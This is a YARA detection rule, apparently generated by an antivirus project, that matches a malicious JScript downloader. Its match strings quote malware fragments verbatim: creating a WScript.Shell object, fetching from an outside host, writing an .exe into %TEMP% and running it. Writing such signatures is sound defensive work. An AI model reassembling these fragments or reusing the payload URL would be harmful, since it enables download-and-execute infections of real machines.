rule sig_20160330_4bb592cceecc2f4d2d817ea25c3551db {
  meta:
    description = "datamaliciousorder - file 20160330_4bb592cceecc2f4d2d817ea25c3551db.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d7c388553d63a2e4450b0671cf490ba1d326fa25f8ebd6a93215e1ca19854e29"

  strings:
    $s1  = "var K0 = function SG() {return WScript[K](\"WScript\"+\".Shell\");}(), GO = 11;" fullword ascii
    $s2  = "function P(ZM, Y){PB = PB * 1; return ZM - Y;};" fullword ascii
    $s3  = "N[F](\"GET\", \"http://tools24.nl/w8isa\", false);" fullword ascii
    $s4  = "if (N[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function G() {return K0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gTpZxvRRD0Hr7Go.ex\" + \"e\";};" fullword ascii
    $s6  = "function H0(){return H1 + \"\";};" fullword ascii
    $s7  = "function SE(U0){K0[\"Run\"](U0, PB, PB);};" fullword ascii
    $s8  = "function JX() {return ((L == true) && (L == BQ)) ? 1 : PB;};" fullword ascii
    $s9  = "function X()" fullword ascii
    $s10 = "function U(){return 22;};" fullword ascii
    $s11 = "var EL = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (RN);" fullword ascii
    $s13 = "function T(){return K;};" fullword ascii
    $s14 = "return P(SK, BO);" fullword ascii
    $s15 = "function H(G0) {var OI = (1, 2, 3, 4, 5, G0); return OI;};" fullword ascii
    $s16 = "var L = false;" fullword ascii
    $s17 = "L = true; " fullword ascii
    $s18 = "var UE = false;" fullword ascii
    $s19 = "var BQ = false;" fullword ascii
    $s20 = "BQ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}